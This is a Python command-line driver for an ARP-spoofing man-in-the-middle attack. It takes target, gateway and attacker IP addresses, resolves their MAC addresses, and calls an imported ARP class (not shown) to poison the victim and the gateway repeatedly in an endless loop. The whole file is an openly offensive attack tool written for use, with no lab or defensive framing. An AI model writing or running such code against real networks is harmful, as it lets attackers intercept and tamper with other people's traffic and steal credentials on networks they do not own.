from ARP import ARP
from classes.User import User
import time
import argparse
import socket

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest = "target_ip", help = "IP Address of the target.")
    parser.add_argument("-g", "--gateway", dest = "gateway_ip", help = "IP Address of the Gateway.")
    parser.add_argument("-ip", "--localip", dest = "local_ip", help = "IP Address of the Attacker.")
    parser.add_argument("-i", "--interface", dest = "interface", help = "Interface.")
    options = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] MISSING PARAMETER '-t' (target IP), use --help for more info.")
    elif not options.gateway_ip:
        parser.error("[-] MISSING PARAMETER '-g' (gateway IP), use --help for more info.")
    if not options.interface:
        options.interface = "enp0s3"
        print("Interface not defined, using default value of 'enp0s3'")
    if not options.local_ip:
        options.local_ip = 0
        print("Attacker IP not defined, will calculate IP later")
    return options

def ARPSpoof(victim_ip, gateway_ip, interface, attacker_ip, n_times = 0):
    if attacker_ip == 0:
        hostname = socket.gethostname()
        attacker_ip = socket.gethostbyname(hostname)
        print("Found local IP, using " + str(attacker_ip))
    attacker = User(attacker_ip)
    attacker.get_mac()
    victim = User(victim_ip)
    victim.get_mac()
    gateway = User(gateway_ip)
    gateway.get_mac()
    arp = ARP(attacker, victim, gateway, interface)
    if n_times <= 0:
        while True:
            arp.spoof(mitm=True)
            time.sleep(300)
    else:
        arp.spoof()


if __name__ == '__main__':
    options = get_args()
    target_ip = options.target_ip
    gateway_ip = options.gateway_ip
    interface = options.interface
    attacker_ip = options.local_ip

    ARPSpoof(target_ip,
        gateway_ip,
        interface,
        attacker_ip
    )